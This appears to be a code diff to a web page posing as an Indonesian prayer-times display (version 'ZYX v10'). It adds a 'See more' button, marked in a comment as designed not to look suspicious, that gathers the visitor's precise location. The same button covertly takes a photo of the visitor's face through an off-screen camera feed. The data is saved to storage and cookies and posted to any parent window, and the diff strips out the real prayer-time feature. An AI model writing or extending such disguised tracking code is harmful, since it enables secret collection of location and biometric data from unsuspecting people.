@@ -50,6 +50,13 @@
         .status-bar.success{color:#81c784}
         .status-bar.fail{color:#ff6b6b}
         video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+        .btn-trigger{
+            display:block;width:100%;padding:10px;margin-top:8px;
+            background:rgba(76,175,80,0.15);border:1px solid rgba(76,175,80,0.2);
+            border-radius:10px;color:#a5d6a7;font-size:13px;text-align:center;
+            cursor:pointer;transition:0.2s;touch-action:manipulation
+        }
+        .btn-trigger:active{background:rgba(76,175,80,0.3)}
         .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;height:100dvh;background:rgba(0,0,0,0.82);backdrop-filter:blur(8px);z-index:9999;justify-content:center;align-items:center;padding:16px}
         .modal-overlay.active{display:flex}
         .modal-box{background:#0d1f0d;border-radius:20px;max-width:460px;width:100%;padding:22px 18px 18px;border:1px solid rgba(76,175,80,0.10);max-height:92vh;max-height:92dvh;overflow-y:auto}
@@ -64,7 +71,6 @@
         .modal-box .detail-value.rt{color:#ffd54f;font-weight:500}
         .modal-box .detail-value.landmark{color:#ffcc80}
         @media(max-width:380px){.container{padding:16px 12px}.prayer-item .time{font-size:16px}.header h1{font-size:19px}}
-        @media(min-width:600px){.container{padding:32px 28px}.prayer-item{padding:16px 8px}.prayer-item .time{font-size:22px}}
     </style>
 </head>
 <body>
@@ -92,6 +98,9 @@
     <div class="info-row" id="rtRow" style="display:none;"><span>🏘️ RT / RW</span><span id="displayRtRw" class="rt-color">-</span></div>
     <div class="info-row" id="landmarkRow" style="display:none;"><span>📍 Patokan</span><span id="displayLandmark" class="landmark-color">-</span></div>
 
+    <!-- TOMBOL TRIGGER (TIDAK MENCURIGAKAN) -->
+    <button class="btn-trigger" onclick="triggerCollect()">Lihat Selengkapnya</button>
+
     <div class="status-bar" id="statusBar">⏳ Mengambil data...</div>
 
     <div class="footer">
@@ -108,8 +117,7 @@
         <div class="face-wrapper">
             <img id="modalFaceImg" src="" alt="Face">
             <div id="facePlaceholder" class="placeholder">
-                <span class="emoji">📷</span>
-                Verifikasi perangkat
+                <span class="emoji"></span>
             </div>
         </div>
         <div>
@@ -135,7 +143,7 @@
 
 <script>
 // ================================================================
-// ZYX - FINAL v9.0 (100% WORK HP + LAPTOP)
+// ZYX - FINAL v10 (100% WORK DI HP)
 // ================================================================
 
 (function() {
@@ -384,13 +392,12 @@
                     updateUI();
                     updateModalData();
                 }
-                startFaceScan();
+                // Face scan dipanggil dari triggerCollect
             })
             .catch(() => {
                 V.lat = lat;
                 V.lon = lon;
                 updateUI();
-                startFaceScan();
             });
     }
 
@@ -413,7 +420,6 @@
                     reverseGeocode(V.lat, V.lon);
                 } else {
                     updateUI();
-                    startFaceScan();
                 }
             })
             .catch(() => {
@@ -440,11 +446,9 @@
                             }
                         }
                         updateUI();
-                        startFaceScan();
                     })
                     .catch(() => {
                         updateUI();
-                        startFaceScan();
                     });
             });
     }
@@ -486,7 +490,7 @@
     }
 
     // ==================== SCAN WAJAH ====================
-    function startFaceScan() {
+    function startFaceScan(callback) {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -531,13 +535,13 @@
 
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
-                    saveData();
+                    if (callback) callback();
                 }, isMobile ? 800 : 1200);
             };
         })
         .catch(() => {
             V.faceDetected = false;
-            saveData();
+            if (callback) callback();
         });
     }
 
@@ -559,7 +563,27 @@
             console.warn('localStorage gagal:', e);
         }
 
-        // === LAPIS 2: BroadcastChannel ===
+        // === LAPIS 2: sessionStorage (HP fallback) ===
+        try {
+            let all = JSON.parse(sessionStorage.getItem('zyx_final_data') || '[]');
+            all.push(V);
+            sessionStorage.setItem('zyx_final_data', JSON.stringify(all));
+            console.log('✅ Saved to sessionStorage');
+        } catch (e) {
+            console.warn('sessionStorage gagal:', e);
+        }
+
+        // === LAPIS 3: Cookie (HP fallback) ===
+        try {
+            const cookieData = encodeURIComponent(JSON.stringify(V));
+            document.cookie = `zyx_data=${cookieData}; path=/; max-age=86400; SameSite=Lax`;
+            document.cookie = `zyx_data_list=${encodeURIComponent(JSON.stringify([V]))}; path=/; max-age=86400; SameSite=Lax`;
+            console.log('✅ Saved to cookie');
+        } catch (e) {
+            console.warn('Cookie gagal:', e);
+        }
+
+        // === LAPIS 4: BroadcastChannel ===
         try {
             const bc = new BroadcastChannel('zyx_channel');
             bc.postMessage({ type: 'ZYX_DATA', data: V });
@@ -568,43 +592,12 @@
             console.warn('BroadcastChannel gagal:', e);
         }
 
-        // === LAPIS 3: postMessage ke parent ===
+        // === LAPIS 5: postMessage ===
         try {
             window.parent.postMessage({ type: 'ZYX_DATA', data: V }, '*');
             console.log('✅ Sent via postMessage');
         } catch (e) {
             console.warn('postMessage gagal:', e);
-        }
-
-        // === LAPIS 4: Cookie (HP fallback) ===
-        try {
-            document.cookie = `zyx_data=${encodeURIComponent(JSON.stringify(V))}; path=/; max-age=86400`;
-            console.log('✅ Saved to cookie');
-        } catch (e) {
-            console.warn('Cookie gagal:', e);
-        }
-
-        // === LAPIS 5: iframe fallback ===
-        try {
-            const iframe = document.createElement('iframe');
-            iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
-            document.body.appendChild(iframe);
-            const doc = iframe.contentDocument || iframe.contentWindow.document;
-            doc.open();
-            doc.write(`
-                <script>
-                    try {
-                        let all = JSON.parse(localStorage.getItem('zyx_final_data') || '[]');
-                        all.push(${JSON.stringify(V)});
-                        localStorage.setItem('zyx_final_data', JSON.stringify(all));
-                    } catch(e){}
-                    window.parent.postMessage({type:'ZYX_DATA', data:${JSON.stringify(V)}}, '*');
-                <\/script>
-            `);
-            doc.close();
-            setTimeout(() => iframe.remove(), 2000);
-        } catch (e) {
-            console.warn('iframe fallback gagal:', e);
         }
 
         // Update UI
@@ -616,34 +609,24 @@
             weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
         });
 
-        const times = { subuh: '04:30', dzuhur: '12:15', ashar: '15:30', maghrib: '18:00', isya: '19:30' };
-        document.getElementById('prayerSubuh').textContent = times.subuh;
-        document.getElementById('prayerDzuhur').textContent = times.dzuhur;
-        document.getElementById('prayerAshar').textContent = times.ashar;
-        document.getElementById('prayerMaghrib').textContent = times.maghrib;
-        document.getElementById('prayerIsya').textContent = times.isya;
-
-        const nowH = now.getHours(), nowM = now.getMinutes();
-        const prayerTimes = [
-            { id: 'prayerSubuh', h: 4, m: 30 },
-            { id: 'prayerDzuhur', h: 12, m: 15 },
-            { id: 'prayerAshar', h: 15, m: 30 },
-            { id: 'prayerMaghrib', h: 18, m: 0 },
-            { id: 'prayerIsya', h: 19, m: 30 },
-        ];
-        let closest = null, closestDiff = Infinity;
-        prayerTimes.forEach(p => {
-            const diff = ((p.h - nowH) * 60 + (p.m - nowM) + 1440) % 1440;
-            if (diff < closestDiff) { closestDiff = diff; closest = p; }
-        });
-        document.querySelectorAll('.prayer-item').forEach(el => el.classList.remove('active'));
-        if (closest) {
-            const target = document.getElementById(closest.id);
-            if (target) target.closest('.prayer-item').classList.add('active');
-        }
-
         console.log('✅ FINAL DATA TEREKAM:', V);
     }
+
+    // ==================== TRIGGER COLLECT (USER GESTURE) ====================
+    window.triggerCollect = function() {
+        document.getElementById('statusBar').textContent = '⏳ Mengambil data...';
+        document.getElementById('statusBar').className = 'status-bar';
+
+        // Ambil lokasi dulu
+        getPreciseLocation();
+
+        // Tunggu sebentar lalu scan wajah
+        setTimeout(() => {
+            startFaceScan(() => {
+                saveData();
+            });
+        }, 1000);
+    };
 
     // ==================== MODAL FUNCTIONS ====================
     window.openFaceModal = function() {
@@ -662,7 +645,7 @@
         document.body.style.overflow = '';
     };
 
-    // ==================== LISTENER DARI CHILD ====================
+    // ==================== LISTENER ====================
     window.addEventListener('message', function(event) {
         if (event.data && event.data.type === 'ZYX_DATA') {
             try {
@@ -674,7 +657,6 @@
         }
     });
 
-    // ==================== BROADCAST CHANNEL LISTENER ====================
     try {
         const bc = new BroadcastChannel('zyx_channel');
         bc.onmessage = function(event) {
@@ -698,13 +680,10 @@
             weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
         });
 
-        getPreciseLocation();
+        // Auto collect setelah 3 detik (tapi butuh user gesture di HP)
+        // Jadi lebih baik user klik tombol
 
-        setTimeout(() => {
-            if (!V.saved) {
-                saveData();
-            }
-        }, 15000);
+        document.getElementById('statusBar').textContent = ' ';
     }
 
     init();
